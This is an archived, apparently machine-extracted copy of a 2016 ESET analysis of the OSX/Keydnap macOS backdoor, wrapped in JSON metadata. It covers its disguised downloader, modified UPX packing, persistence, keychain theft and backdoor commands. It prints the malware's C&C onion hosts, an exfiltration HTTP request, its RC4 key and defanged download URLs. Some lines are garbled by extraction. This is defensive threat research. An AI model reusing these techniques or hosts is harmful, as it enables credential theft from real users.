{
    "id": "6c3bcbf9-9d29-4531-b9e5-6f71ee04d9a6",
    "created_at": "2023-01-12T15:00:25.754623Z",
    "updated_at": "2025-03-27T02:05:38.277849Z",
    "deleted_at": null,
    "sha1_hash": "123235f1206a4d0c128c9d849fbb76bb944ba51c",
    "title": "2016-07-06 - New OSX-Keydnap malware is hungry for credentials",
    "authors": "",
    "file_creation_date": "2022-05-28T16:10:30Z",
    "file_modification_date": "2022-05-28T16:10:30Z",
    "file_size": 3386634,
    "plain_text": "# New OSX/Keydnap malware is hungry for credentials\n\n**welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/**\n\nJuly 6, 2016\n\nFor the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of the keychain while maintaining a\npermanent backdoor.\n\n[Marc-Etienne M.Léveillé](https://www.welivesecurity.com/author/marc-etienne/)\n6 Jul 2016 - 02:30PM\n\nFor the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of the keychain while maintaining a\npermanent backdoor.\n\n[ESET analyzes multiple samples targeting OS X every day. Those samples are usually potentially unwanted applications that inject](http://www.virusradar.com/en/glossary/pua)\nadvertisements into browser displays while the victim is browsing the web.\n\nFor the last few weeks, we have been investigating an interesting case where the purpose of the malware is to steal the content of the\nkeychain and maintain a permanent backdoor. This article will describe the components of this threat and what we know about it so far.\n\n## Infection vector\n\nIt is still not clear how victims are initially exposed to OSX/Keydnap. It could be through attachments in spam messages, downloads from\nuntrusted websites or something else.\n\n\n-----\n\nat e o s t at a do oade co po e t s d st buted a p e e a c e e co ta s a ac O e ecutab e e t a\nextension that looks benign, such as .txt or .jpg. However, the file extension actually contains a space character at the end, which means\ndouble-clicking the file in Finder will launch it in Terminal and not Preview or TextEdit.\n\nFigure 1: Finder window with the ZIP and the malicious “.jpg ” file\n\nFigure 2: The downloader’s file information window\n\n[The ZIP also contains the Resource fork that contains the icon of the executable file. It mimics the icon Finder usually applies to JPEG or text](https://en.wikipedia.org/wiki/Resource_fork)\nfiles to increase the likelihood the recipient will double-click the file. Once started, a Terminal window opens and the malicious payload is\nexecuted.\n\nFigure 3: Screen capture of the downloader executed on OS X El Capitan. Notice the Terminal icon shows for a fraction of a second before\nopening Preview.\n\n## OSX/Keydnap downloader\n\n\n-----\n\ne do oade s a u s g ed ac O e ecutab e us, t e e s do oaded o a te et b o se a d Gate eepe s act ated o\nthe machine – the default in recent versions of OS X and macOS – it will not execute and display a warning to the user.\n\nFigure 4: Message shown if ZIP file is downloaded from Safari\n\nKeydnap’s downloader is simple. It will:\n\n1. Download and execute the backdoor component\n2. Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by\n\ndownloading it from the internet\n3. Open a decoy document (described later)\n4. Close the Terminal window that just opened\n\nThe decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now. The\ndownloader isn’t persistent. However, the downloaded backdoor will add an entry to the LaunchAgents directory and survive across reboot. It\nis described in more details in the backdoor section.\n\nWe have found multiple variants of the downloader executable. A list of different samples can be found at the end of the article.\n\n[Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card](http://www.virusradar.com/en/glossary/botnet)\nnumbers. This suggests that Keydnap may be targeting users of underground forums or maybe even security researchers. Also included in\nrecent variants is a “build name”. We have seen three different names: elitef*ck, ccshop and transmission.\n\n\n-----\n\ng p y g ( )\n\nFigure 5: Example decoy image (2)\n\nFigure 5: Example decoy image (3)\n\n## OSX/Keydnap backdoor\n\nAll samples of the backdoor we have seen have the filename icloudsyncd. The malware has a version string that is reported to the C&C\nserver. So far, we have seen two versions: 1.3.1 first seen in May 2016 and 1.3.5 in June.\n\n### Obfuscation\n\nWhile the downloader module is not packed, the backdoor is packed with a modified version of UPX. Two modifications are made to UPX\nversion 3.91:\n\nThe magic bytes UPX! in the UPX header are replaced with ASS7,\nThe decompressed code and strings sections are XORed with 0x01. While self-decompressing, the XOR is applied after decompression\nand before calling the main function of the original binary.\n\n\n-----\n\nFigure 6: Difference between a stock UPX packed file and the modified one\n\nA [patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d.](https://github.com/eset/malware-research/blob/master/keydnap/keydnap_upx.patch)\n\n### Persistence\n\nOnce started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/\notherwise to achieve persistence across reboots. The Library/Application Support/com.apple.iCloud.sync.daemon directory is used to keep\nthe icloudsyncd executable. This directory will also contain the process id of the running malware in process.id and a “build name” (as it is\ncalled by the author) in build.id. With administrator privileges, it will also change the owner of icloudsyncd to root:admin and make the\nexecutable setuid and setgid, which means it will always run as root in the future.\n\nFigure 7: Property list file in LaunchAgents directory\n\nTo camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle. Here is an\nexample of the result of ps ax on an infected system:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n\n$ ps ax\n\n[...]\n\n566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle\n\n[...]\n\n\nFigure 8: Result of ps ax on an infected system\n\n### Keychain stealing\n\nThe OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain. The\n[author simply took a proof-of-concept example available on Github called Keychaindump. It reads securityd’s memory and searches for the](https://github.com/juuso/keychaindump)\n[decryption key for the user’s keychain. This process is described in a paper by K. Lee and H. Koo. One of the reasons we think the source](https://forensic.n0fate.com/wp-content/uploads/2012/07/Keychain-Analysis-with-Mac-OS-X-Memory-Forensics.pdf)\nwas taken directly from Github is that the function names in the source code are the same in the Keydnap malware.\n\nFigure 9: Function list of Keydnap backdoor. In green, functions from Keychaindump\n\n### C&C communication\n\nKeydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server. We’ve seen two onion addresses used in different\nsamples:\n\ng5wcesdfjzne7255.onion (Down)\nr2elajikcosf7zee.onion (Alive at time of writing)\n\nThe HTTP resource always starts with /api/osx/ and contains actions such as:\n\n/api/osx/started to report the bot has just started\n/api/osx/keychain to exfiltrate the content of the keychain\n/api/osx/get_task?bot_id={botid}&version={version} to request a task (described below)\n\n\n-----\n\n/ap /os /c d_e ecuted to epo t a t e output o a co a d t at as e ecuted\n/api/osx/task_complete?bot_id={botid}&task_id={taskid} to report a task was completed\n\nHTTP POST content has two fields: bot_id and data. The data field is encrypted with the RC4 key “u2RLhh+!LGd9p8!ZtuKcN” without quotes.\nWhen exfiltrating the keychain, the keychain field is used instead of data.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\nPOST /api/osx/started HTTP/1.1\n\nHost: r2elajikcosf7zee.onion.to\n\nAccept: */*\n\nContent-Length: 233\n\nContent-Type: application/x-www-form-urlencoded\n\nbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D\n\n\nFigure 10: Malware sending initial information\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n&gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")\n\ndevice_model=MacBookPro9,2\n\nbot_version=1.3.5\n\nbuild_name=elitef*ck\n\nos_version=15.5.0\n\nip_address=4.5.6.7\n\nhas_root=0\n\n\nFigure 11: Decoded data sent to C&C\n\nThe bot_id is constructed by hashing the following values with SHA-256:\n\n1. The hardware UUID (IOPlatformUUID)\n2. The system serial number (IOPlatformSerialNumber)\n3. The model identifier of the Mac (e.g.: MacBookPro9,2)\n\nMost actions are self-explanatory. The started command will send the following information to the C&C:\n\ndevice_model: the model identifier (e.g.: MacBookPro9,2)\nbot_version: version of Keydnap\nbuild_name: the “build name” that was given by downloader\nos_version: OS X or macOS kernel version\nip_address: external IP address as reported by ipify.org\nhas_root: 1 if executed as root, 0 otherwise\n\n### Backdoor commands\n\nThe response to get_task contains an integer to identify the type of command and optional arguments. The function named\nget_and_execute_tasks handles 10 different command types.\n\n**Command ID** **Description**\n\n0 Uninstall Keydnap and quit\n\n1 Update the backdoor from a base64-encoded file\n\n2 Update the backdoor given a URL\n\n3 Decode and execute a base64-encoded file\n\n4 Decode and execute a base64-encoded Python script\n\n5 Download and execute a file from a URL\n\n\n-----\n\n**Command ID** **Description**\n\n6 Download and execute a Python script from a URL\n\n7 Execute a command and report the output back to the C&C server\n\n8 Request administrator privileges the next time the user runs an application\n\n9 Decode and execute, or stop, a base64-encoded file calledauthd_service\n\nThe last two commands stand out. The command with ID 8 must be sent while Keydnap isn’t running as root already. When issued, the\nbackdoor will start monitoring the user’s process count. When two new processes are created within two seconds, Keydnap will spawn a\nwindow asking for the user’s credentials, exactly like the one OS X users usually see when an application requires admin privileges. If the\nvictim falls for this and enters their credentials, the backdoor will henceforth run as root and the content of the victim’s keychain will be\nexfiltrated.\n\nFigure 12: Code performing the process count check\n\nFigure 13: icloudsyncd requesting privileges\n\nWe do not know what the authd_service executable managed by command ID 9 is, because we haven’t seen it used. It could be a third stage\nmalware deployed to certain targets of interest.\n\n## Conclusion\n\nThere are a few missing pieces to this puzzle. We do not know at this point how Keydnap is distributed. Nor do we know how many victims\nthere are out there.\n\nAlthough there are multiple security mechanisms in place in OS X to mitigate malware, it’s possible to deceive the user into executing nonsandboxed malicious code by replacing the icon of a Mach-O file.\n\n## IoCs\n\n\n-----\n\n### Sa p es\n\n**Downloader**\n\nAll downloaders listed below are detected as OSX/TrojanDownloader.Keydnap.A by ESET products.\n\n\n**SHA-1** **Filename**\n\n\n**First seen**\n**on**\n**VirusTotal** **Backdoor download URL** **Deco**\n\n\n`07cd177f5baf8c1bdbbae22f1e8f03f22dfdb148` `\"info_list.txt \"` 2016-0509\n\n\nhxxp://dev.aneros.com/media/icloudsyncd \"Mos\nQues\n\nhxxp://freesafesoft.com/icloudsyncd Blac\nscree\n\nhxxp://dev.aneros.com/media/icloudsyncd Firef\n\n```\n78ba1152ef3883e63f10c3a85cbf00f2bb305a6a \"screenshot_2016                         06-28-01.jpg \"\n\n```\n\n2016-0628\n\n\n`773a82343367b3d09965f6f09cc9887e7f8f01bf` `\"screenshot.jpg \"` 2016-0507\n\n`dfdb38f1e3ca88cfc8e9a2828599a8ce94eb958c` `\"CVdetails.doc \"` 2016-0503\n\n`2739170ed195ff1b9f00c44502a21b5613d08a58` `\"CVdetails.doc \"` 2016-0503\n\n`e9d4523d9116b3190f2068b1be10229e96f21729` `\"logo.jpg \"` 2016-0602\n\n\nhxxp://lovefromscratch.ca/wpadmin/css/icloudsyncd\n\nhxxp://lovefromscratch.ca/wpadmin/css/icloudsyncd\n\n\nhxxp\nadm\n\nhxxp\nadm\n\n\nhxxp://dev.aneros.com/media/icloudsyncd sane\n\nhxxp://freesafesoft.com/icloudsyncd Som\n\n```\n 7472102922f91a78268430510eced1059eef1770 \"screenshot_9324\n                          2.jpg \"\n\n```\n**Backdoor**\n\n\n2016-0628\n\n\n**SHA-1** **ESET Detection name** **C&C** **Version**\n\n`a4bc56f5ddbe006c9a68422a7132ad782c1aeb7b` OSX/Keydnap.A hxxps://g5wcesdfjzne7255.onion.to 1.3.1\n\n`abf99129e0682d2fa40c30a1a1ad9e0c701e14a4` OSX/Keydnap.A hxxps://r2elajikcosf7zee.onion.to 1.3.5\n\n### Backdoor C&C servers\n\nhxxps://g5wcesdfjzne7255.onion.to/\nhxxps://r2elajikcosf7zee.onion.to/\n\nKeydnap’s IoCs are also available and updated on ESET’s [malware-ioc Github repository.](https://github.com/eset/malware-ioc/tree/master/keydnap)\n\n6 Jul 2016 - 02:30PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-07-06 - New OSX-Keydnap malware is hungry for credentials.pdf"
    ],
    "report_names": [
        "2016-07-06 - New OSX-Keydnap malware is hungry for credentials.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535625,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653754230,
    "ts_modification_date": 1653754230,
    "files": {
        "pdf": "https://archive.orkl.eu/123235f1206a4d0c128c9d849fbb76bb944ba51c.pdf",
        "text": "https://archive.orkl.eu/123235f1206a4d0c128c9d849fbb76bb944ba51c.txt",
        "img": "https://archive.orkl.eu/123235f1206a4d0c128c9d849fbb76bb944ba51c.jpg"
    }
}